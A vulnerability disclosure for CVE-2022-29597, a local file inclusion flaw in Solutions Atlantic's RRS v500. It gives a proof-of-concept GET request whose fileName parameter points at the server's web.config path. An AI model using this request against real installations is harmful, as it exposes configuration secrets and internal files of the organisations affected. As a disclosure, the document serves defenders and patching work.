# CVE-2022-29597: Local File Inclusion in RSS v500

The [RRS](https://solutions-atlantic.com/regulatory-reporting-system/) v500 application by Solutions Atlantic is vulnerable to a Local File Inclusion (LFI) vulnerability. Any authenticated user has the ability to reference internal system files within requests made to the `/RRSWeb/maint/ShowDocument/ShowDocument.aspx` page. The server will successfully respond with the file contents of the internal system file requested. This ability could allow for adversaries to extract sensitive data and/or files from the underlying file system, gain knowledge about the internal workings of the system, or access source code of the application.

Mitre URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29597

NIST URL: https://nvd.nist.gov/vuln/detail/CVE-2022-29597

## Proof of Concept (POC):

### Show Document Functionality:

**Affected URL:** 

- `/RRSWeb/maint/ShowDocument/ShowDocument.aspx`

While opening or downloading a PDF from the RRS site, a request is made to the affected URL that includes a `fileName` parameter. This parameter could be modified to include an internal system path, such as `web.config`. The server will then serve the file requested. 

**GET request with internal path to web.config:**

```http
GET /RRSWeb/maint/ShowDocument/ShowDocument.aspx?fileName=C:\\Program%20Files\\Solutions%20Atlantic\\RRS\\RRSWeb\\web.config HTTP/1.1
Host: <REDACTED>
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://<REDACTED>/RRSweb/default.aspx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=<REDACTED>; ASP.NET_SessionId=<REDACTED>
Connection: Keep-Alive


```

Server Response:

![RRS_LFI_web.config](https://raw.githubusercontent.com/TheGetch/CVE-2022-XXXXX-LFI/main/RRS_LFI_web.config.png)


## Discovery
April 2022
- Eric Getchell - TheGetch

